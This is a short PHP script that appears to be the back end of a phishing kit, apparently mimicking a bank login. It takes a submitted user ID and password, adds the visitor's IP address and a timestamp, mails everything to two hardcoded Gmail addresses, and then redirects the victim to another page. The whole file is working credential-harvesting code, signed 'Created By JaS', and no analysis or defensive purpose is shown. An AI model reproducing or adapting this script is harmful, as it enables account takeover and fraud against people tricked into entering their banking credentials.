<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['user_id'];
$pass1 = $_POST['password'];
$chaseme="greensusandotun@gmail.com,dontaesusan@gmail.com";


  $subj = "[File]  $ip";
  $msg = "CD Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaS\n-----------------------------------";
  $from = "From: <FIle>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: WP.php");